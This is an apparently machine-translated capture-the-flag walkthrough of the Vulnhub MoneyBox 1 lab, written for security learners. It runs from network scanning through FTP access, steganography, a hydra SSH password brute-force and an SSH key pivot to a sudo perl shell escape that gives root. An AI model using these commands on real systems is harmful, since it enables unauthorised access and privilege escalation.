<html>
<head>
<title>Vulnhub: MoneyBox 1 Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vulnhub:钱箱1演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/vulnhub-moneybox-1-walkthrough-fcee571b52ae?source=collection_archive---------3-----------------------#2022-01-05">https://infosecwriteups.com/vulnhub-moneybox-1-walkthrough-fcee571b52ae?source=collection_archive---------3-----------------------#2022-01-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b5cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我再次来到这里给你我的另一篇文章(写于5个月前！)的箱子从<strong class="jp ir"> vulnhub <em class="kl">钱箱1 </em> </strong>。你可以在<a class="ae km" href="https://hellfire0x01.medium.com/vulnhub-pwned-1-walkthrough-af16ad8cdff9" rel="noopener">Vulnhub:Pwned 1 walk through</a>上阅读我的博客，里面有我以前的文章(我以前是怎么写的)。你可以从这里下载这个盒子，</p><div class="kn ko gp gr kp kq"><a href="https://www.vulnhub.com/entry/moneybox-1,653/" rel="noopener  ugc nofollow" target="_blank"><div class="kr ab fo"><div class="ks ab kt cl cj ku"><h2 class="bd ir gy z fp kv fr fs kw fu fw ip bi translated">钱箱:1</h2><div class="kx l"><h3 class="bd b gy z fp kv fr fs kw fu fw dk translated">该网站使用“cookies”为您提供最佳、最相关的体验。使用这个网站意味着你对…</h3></div><div class="ky l"><p class="bd b dl z fp kv fr fs kw fu fw dk translated">www.vulnhub.com</p></div></div><div class="kz l"><div class="la l lb lc ld kz le lf kq"/></div></div></a></div><p id="c0c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">扫描网络</strong></p><p id="77cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe lg lh li lj b">netdiscover</code>我们将找出机器的IP地址，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="0092" class="ls lt iq lj b gy lu lv l lw lx">sudo netdiscover -r 10.0.2.0/24</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/e7cca79d89e0cec432e05636ea8284b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1320/format:webp/1*5fruKd95csYj6WWIA6GNxA.png"/></div></figure><p id="81ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道了机器的IP地址，我们可能想知道哪些端口是打开的，服务正在运行，等等，我们将通过nmap实现这一点，我们将把输出保存在<strong class="jp ir"> nmap.txt </strong>中。</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="e62d" class="ls lt iq lj b gy lu lv l lw lx">sudo nmap -A -T4 -p- 10.0.2.55 &gt; nmap.txt</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/68a35474f19995a33623a6630f2f11bb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1370/format:webp/1*342J0tNh_Xv6bTcw8gdvFQ.png"/></div></div></figure><p id="f1a3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到3个端口是开放的，FTP(21)、SSH(22)、HTTP(80)[WEB]服务都在这些端口上运行。</p><p id="c010" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，试着通过whatweb了解网站上运行着什么技术，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="6d8c" class="ls lt iq lj b gy lu lv l lw lx">whatweb 10.0.2.55</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mg"><img src="../Images/3fd2bee950622b1f1f5c218ed40a61e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-EYTy3ZwW-CJMBIGQDilWw.png"/></div></div></figure><p id="1351" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们没发现什么特别的。</p><p id="9192" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们将使用<strong class="jp ir"> gobuster </strong>工具暴力破解目录，并将输出保存在<strong class="jp ir"> gobuster.txt </strong>文件中，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="0c7a" class="ls lt iq lj b gy lu lv l lw lx">gobuster dir http://10.0.2.55/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php 2&gt;/dev/null &gt; gobuster.txt</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/3efe36d7001a765ddd447e31a55e855d.png" data-original-src="https://miro.medium.com/v2/resize:fit:626/format:webp/1*Cf8Xt6IcUbB0KOkww5M8lQ.png"/></div></figure><p id="d09b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">枚举:</strong></p><p id="e930" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，让我们导航到<a class="ae km" href="http://10.0.2.55/" rel="noopener ugc nofollow" target="_blank"> http://10.0.2.55 </a>，我们到达网页，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/bda7de74b547a445c6ba6815d7b45bf6.png" data-original-src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*u3ituPs5AnSq9F_sWBF5bg.png"/></div></figure><p id="afd9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们导航到<strong class="jp ir">/博客</strong>路径，看看是否有适合我们的东西，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mj"><img src="../Images/c712c02cf06c835ab7292e48dfec20a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*GEqlTPgsfrUz4bnqiJMUPA.png"/></div></div></figure><p id="3284" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查了它的源代码，发现了这个，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/2accf7baa528039920ca38d47017ca96.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*xVMZZtM1yL3iBkAwXmy7Sw.png"/></div></figure><p id="a971" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们导航到<strong class="jp ir"> /S3cr3t-T3xt </strong>路径，我找到了这个</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/5033002567e233da3853b09e9ed6d7b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1296/format:webp/1*vuoalxt1QDoR-WiO6LIUFA.png"/></div></figure><p id="abee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是看看源代码，我们找到了秘钥，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/1339760ae04b7915b2b7ef73accc174d.png" data-original-src="https://miro.medium.com/v2/resize:fit:674/format:webp/1*F4pnBmyru1W3Vse3clsYMA.png"/></div></figure><p id="4cf2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">也许这就是从图像中提取数据的关键。</p><p id="a18b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我将通过匿名登录ftp，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="8bfa" class="ls lt iq lj b gy lu lv l lw lx">ftp 10.0.2.55</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/74eb18c5ebeee048b4cf1d3909f931ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:810/format:webp/1*Xi_9qY0DPQHzkTRj6ALSsg.png"/></div></figure><p id="229d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们连上了ftp。现在我们来列举一下</p><p id="1fc8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe lg lh li lj b">ls -la</code>列出目录的所有内容，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/3d3176cb52b23fb4ade092259cdd3bf6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1366/format:webp/1*eJo5Bkoc7Ra_yE8Ki073mg.png"/></div></figure><p id="1e07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">图像被找到，所以我将下载这个图像到我们的本地系统。</p><p id="8ddb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe lg lh li lj b">get</code>命令下载该文件，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/81fdd764b485fd97f32ef35cccd89f3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1382/format:webp/1*nebpeBftOYE8d9X9Bhn9Ig.png"/></div></figure><p id="66e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将退出ftp。</p><p id="dcf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在我从秘密目录中找到密钥之前，短语<strong class="jp ir"> 3********t4 </strong> ( <strong class="jp ir"> l33t代码</strong>)意味着<strong class="jp ir">提取数据</strong>，所以我将尝试使用隐写工具从图像中提取数据(<strong class="jp ir">隐写图</strong>)</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="881b" class="ls lt iq lj b gy lu lv l lw lx">steghide extract -sf trytofind.jpg</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/230f3fbea5203e5aabdaa9029d6ab96c.png" data-original-src="https://miro.medium.com/v2/resize:fit:862/format:webp/1*jECfw7Km7IrFUnBZUzYDRw.png"/></div></figure><p id="e2db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在正在读取新提取的文件data.txt的内容，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/0604d134a7a22675949c21f08139a561.png" data-original-src="https://miro.medium.com/v2/resize:fit:1372/format:webp/1*mT8fj-EjX3WsX-5zSb861g.png"/></div></figure><p id="45b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看完这个，我们知道<strong class="jp ir"> renu </strong>是用户名，消息引用密码太弱，也就是说，我们可以使用<strong class="jp ir"> hydra工具</strong>破解密码，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="d244" class="ls lt iq lj b gy lu lv l lw lx">hydra -l renu -P /usr/share/wordlists/rockyou.txt 10.0.2.55 -t 4 ssh</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/672eb559eb01045c1b98b4e550e75fee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*7Zv3iqbPTQgcjVa-mrcTtg.png"/></div></figure><p id="c3d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">剥削:</strong></p><p id="71ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">唉，我们得到了用户名<strong class="jp ir"> renu </strong>和密码来认证SSH，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="63c6" class="ls lt iq lj b gy lu lv l lw lx">ssh renu@10.0.2.55</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/83925bdfebdf95e536c458f9e830944b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*XswqLIVcdrxVDpr3FkBJ2w.png"/></div></figure><p id="7010" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们被认证为renu用户。现在，用户1标志，</p><p id="5dcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行<strong class="jp ir"> ls </strong>命令列出目录内容，执行<strong class="jp ir"> cat </strong>命令读取文本文件内容，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/2c42e6f22a43a7d4c5f2d71e42983e56.png" data-original-src="https://miro.medium.com/v2/resize:fit:686/format:webp/1*ig-d-vS9GQMfE8i2uXzF0w.png"/></div></figure><p id="7e7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了user1标志，现在我将研究如何得到user2标志，</p><p id="d2de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">做<code class="fe lg lh li lj b">ls</code>将列出目录的内容，我发现有2个用户，我决定导航到lily目录，做<code class="fe lg lh li lj b">ls -la</code>，我发现隐藏目录<strong class="jp ir">。ssh </strong>(可以有办法认证我们是用户lily)，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/e6553331713157514122a32c4a79db19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*2GgQScmTvEyb60Hp09FyiQ.png"/></div></figure><p id="dfb2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在<strong class="jp ir">内导航。ssh </strong>目录，做<code class="fe lg lh li lj b">ls</code>，我们得到<strong class="jp ir"> authorized_keys </strong>，使用<code class="fe lg lh li lj b">cat</code>命令读取文件里面的文本，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mv"><img src="../Images/0751abc4b7a52262a610a5d575049aec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XVpm_AnNz1CvtiYbDlNwBw.png"/></div></div></figure><p id="4e5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们知道我们可以在不知道密码的情况下认证我们是lily用户，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="3c35" class="ls lt iq lj b gy lu lv l lw lx">ssh lily@10.0.2.55</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/b0c7f111005b9ad1c6ba9609f8c640ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1364/format:webp/1*G_ivh1iYmJnJuddifofBEQ.png"/></div></figure><p id="3cc9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们是lily用户。寻找用户2标志，</p><p id="aec4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">做<code class="fe lg lh li lj b">ls</code>然后<code class="fe lg lh li lj b">cat</code>，我们得到了我们的用户2标志，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/bc989a64bdef63d11b4c298c51cbbae1.png" data-original-src="https://miro.medium.com/v2/resize:fit:690/format:webp/1*aZCETGwS899XPEKbMaAd7Q.png"/></div></figure><p id="ffea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我将运行命令<strong class="jp ir"> sudo -l </strong>,看看我是否可以在机器上运行命令来获得root访问权限，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="f136" class="ls lt iq lj b gy lu lv l lw lx">sudo -l</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi my"><img src="../Images/fae7efc6c3985da75f8a7f137148fede.png" data-original-src="https://miro.medium.com/v2/resize:fit:1376/format:webp/1*_PnzEhioYtg26cTj7eBmug.png"/></div></figure><p id="0851" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以作为lily用户运行命令，</p><pre class="lk ll lm ln gt lo lj lp lq aw lr bi"><span id="5122" class="ls lt iq lj b gy lu lv l lw lx">sudo perl -e 'exec "/bin/sh";'<br/>python3 -c 'import pty;pty.spawn("/bin/bash")'</span></pre><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/9fa08af0146fd812b11f1dcf49efa0a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1062/format:webp/1*KhkXpS6lJibb7WwlfE3Cag.png"/></div></figure><p id="3adb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<code class="fe lg lh li lj b">cd</code>导航到根目录并执行<code class="fe lg lh li lj b">ls -la</code>，</p><figure class="lk ll lm ln gt lz gh gi paragraph-image"><div class="gh gi na"><img src="../Images/c6b9e2b44403987b87cf43c96bb27096.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/format:webp/1*1LqEnVGdywHrj13ceb9vaw.png"/></div></figure><p id="dd02" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有根旗！</p><p id="d4a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">抓紧了，我的伙计们，下次再见！再见。</p></div></div>    
</body>
</html>